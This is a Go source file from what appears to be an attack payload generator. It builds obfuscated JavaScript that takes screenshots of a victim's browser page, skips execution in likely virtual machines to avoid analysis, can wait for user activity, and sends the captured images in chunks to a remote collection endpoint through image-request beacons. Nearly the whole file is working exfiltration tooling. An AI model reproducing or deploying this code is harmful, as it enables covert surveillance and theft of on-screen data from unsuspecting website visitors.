package payloads

import (
	"fmt"
	"strings"
)

// ScreenExfilConfig holds configuration for screenshot & exfiltration payload.
type ScreenExfilConfig struct {
	Quality       int    `json:"quality,omitempty"`
	Interval      int    `json:"interval,omitempty"`
	MaxWidth      int    `json:"max_width,omitempty"`
	MaxHeight     int    `json:"max_height,omitempty"`
	ExfilMethod   string `json:"exfil_method,omitempty"`
	ExfilEndpoint string `json:"exfil_endpoint,omitempty"`
	ExfilURL      string `json:"exfil_url,omitempty"`
	OnActivity    bool   `json:"on_activity,omitempty"`
	DetectVM      bool   `json:"detect_vm,omitempty"`
}

// GenerateScreenExfil creates a JavaScript screenshot capture & exfiltration payload.
func GenerateScreenExfil(cfg ScreenExfilConfig) (string, error) {
	if cfg.ExfilEndpoint == "" {
		cfg.ExfilEndpoint = strings.TrimSpace(cfg.ExfilURL)
	}
	if cfg.ExfilEndpoint == "" {
		cfg.ExfilEndpoint = "https://collector.example.com/screen"
	}
	if cfg.Quality <= 0 {
		cfg.Quality = 75
	}
	if cfg.MaxWidth <= 0 {
		cfg.MaxWidth = 1920
	}
	if cfg.MaxHeight <= 0 {
		cfg.MaxHeight = 1080
	}

	varName := randomString(8)
	captureFunc := randomString(10)

	vmCheck := ""
	if cfg.DetectVM {
		vmCheck = `
  var vmIndicators = navigator.userAgent.toLowerCase().includes('vmware') ||
    navigator.hardwareConcurrency <= 2 ||
    screen.width === 0 || screen.height === 0;
  if(vmIndicators) return;`
	}

	activityCheck := ""
	if cfg.OnActivity {
		activityCheck = `var lastMove = Date.now();
  document.addEventListener('mousemove', function(){ lastMove = Date.now(); });
  document.addEventListener('keydown', function(){ lastMove = Date.now(); });
  var isActive = function(){ return (Date.now() - lastMove) < 60000; };
`
	} else {
		activityCheck = "var isActive = function(){ return true; };"
	}

	intervalCode := ""
	if cfg.Interval > 0 {
		intervalCode = fmt.Sprintf(`setInterval(function(){
    if(isActive()){%s();}
  }, %d * 1000);`, captureFunc, cfg.Interval)
	} else {
		intervalCode = fmt.Sprintf("setTimeout(function(){%s();}, 1000);", captureFunc)
	}

	payload := fmt.Sprintf(`(function(){
  var %s = {ep:'%s',q:%d,mw:%d,mh:%d};
  %s
  %s
  
  function %s(){
    var c = document.createElement('canvas');
    c.width = %s.mw;
    c.height = %s.mh;
    var ctx = c.getContext('2d');
    
    if(typeof html2canvas !== 'undefined'){
      html2canvas(document.body,{
        width: %s.mw,
        height: %s.mh,
        useCORS: true,
        allowTaint: true
      }).then(function(canvas){
        sendScreenshot(canvas.toDataURL('image/jpeg',%s.q/100));
      });
    } else {
      ctx.drawWindow(window,0,0,%s.mw,%s.mh,'rgb(255,255,255)');
      sendScreenshot(c.toDataURL('image/jpeg',%s.q/100));
    }
  }
  
  function sendScreenshot(dataUrl){
    var b64 = dataUrl.split(',')[1];
    var chunkSize = 131072;
    for(var i=0;i<b64.length;i+=chunkSize){
      var chunk = b64.substr(i,chunkSize);
      var part = Math.floor(i/chunkSize);
      new Image().src = '%s?s='+part+'&t='+b64.length+'&d='+chunk;
    }
  }
  
  %s
})();`, varName, cfg.ExfilEndpoint, cfg.Quality, cfg.MaxWidth, cfg.MaxHeight, vmCheck, activityCheck, captureFunc, varName, varName, varName, varName, varName, varName, varName, varName, cfg.ExfilEndpoint, intervalCode)

	return ObfuscateJS(payload), nil
}
